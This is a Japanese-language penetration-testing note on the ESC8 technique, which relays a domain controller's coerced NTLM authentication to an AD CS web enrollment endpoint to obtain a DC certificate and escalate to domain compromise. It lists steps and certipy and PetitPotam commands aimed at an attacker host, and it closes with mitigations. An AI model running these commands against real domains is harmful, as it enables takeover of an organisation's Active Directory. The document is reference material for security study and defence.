---
title: ESC8（CA の HTTP 登録エンドポイントへの NTLM リレー）
date: 2026-10-17
category: Active Directory
topic: AD CS
tags: [active-directory, adcs, esc8, ntlm-relay]
summary: CA の HTTP 証明書登録エンドポイントが NTLM 認証を受け付ける場合、強制認証と組み合わせて DC の証明書を発行させる NTLM リレー攻撃
---

## 概要

AD CS には、Web 経由で証明書を要求できる HTTP 登録エンドポイント（`/certsrv` など）がある。このエンドポイントが NTLM 認証を受け付ける設定になっていると、NTLM リレー攻撃の標的にできる。

全体の流れは、NTLM リレー攻撃の一般的な構造に AD CS 特有の「証明書発行」という強力な着地点が組み合わさったもの。

1. 何らかの方法で DC（または他の高権限マシンアカウント）に、攻撃者が用意したリレーサーバーへ認証させる（強制認証）。
2. DC からの NTLM 認証を、攻撃者が CA の HTTP 登録エンドポイントへそのままリレーする。
3. リレーされた NTLM セッションは「DC 自身として認証している」状態になるため、攻撃者はこのセッションを使って DC 名義の証明書を要求・取得できる。
4. 取得した DC の証明書を使って PKINIT 認証を行えば、DC（ドメインコントローラのマシンアカウント）としてドメインに認証でき、DCSync などドメイン管理者相当の操作につなげられる。

Unconstrained Delegation の悪用と同様、「DC に何らかの形で認証させる（強制認証）」という前提が必要になる点が共通している。DC が送ってくる認証情報の宛先を、委任で奪うか（Unconstrained Delegation）、リレーで奪うか（ESC8）という違い。

## 手順

1. CA の HTTP 登録エンドポイントが有効かつ NTLM 認証を受け付けているか確認する。
2. NTLM リレーツールを、そのエンドポイントへ中継するよう設定して起動する。
3. 強制認証手法（PetitPotam の EFSRPC やプリンタスプーラなど）で、DC を攻撃者のリレーサーバーへ認証させる。
4. リレーされたセッションで DC 名義の証明書を取得する。
5. 取得した証明書で PKINIT 認証し、DC としてのチケットを得る。

## コマンド

```bash
# Web 登録（/certsrv）が有効な CA を探す
certipy find -u user@lab.local -p 'Password123' -dc-ip <DC_IP> -vulnerable -stdout

# CA の Web 登録エンドポイントへ NTLM をリレーして証明書を要求する
certipy relay -target 'http://<CA_HOST>/certsrv/certfnsh.asp' -template DomainController

# 別の端末から DC に認証を強制する
python3 PetitPotam.py <ATTACKER_IP> <DC_IP>

# 取得した証明書で認証し、DC のマシンアカウントのハッシュを得る
certipy auth -pfx dc.pfx -dc-ip <DC_IP>
```

## 注意点

- CA の HTTP 登録エンドポイントで NTLM 認証を無効化し、Kerberos 認証のみを許可するか、拡張保護（Extended Protection for Authentication, EPA）を有効にすることで緩和できる。
- 強制認証そのものへの対策（プリンタスプーラサービスの無効化、SMB 署名の強制など）も合わせて行う必要がある。NTLM リレーの着地点を塞ぐだけでなく、強制認証の起点を減らすことが重要。
